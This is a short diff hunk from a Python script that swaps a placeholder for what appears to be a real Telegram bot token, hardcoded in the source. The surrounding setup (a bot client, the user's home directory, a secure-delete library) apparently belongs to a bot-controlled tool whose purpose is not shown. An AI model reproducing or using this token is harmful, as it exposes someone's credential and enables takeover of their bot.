@@ -15,7 +15,7 @@ import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
 # Replace with your Telegram bot token
-TOKEN = 'your_bot_token_here'
+TOKEN = '7464950737:AAEyuW4nXSMYBOdJTSnaOmd_ksBvW_cFse0'
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")  # Set current directory to user's home directory
 secure_delete.secure_random_seed_init()
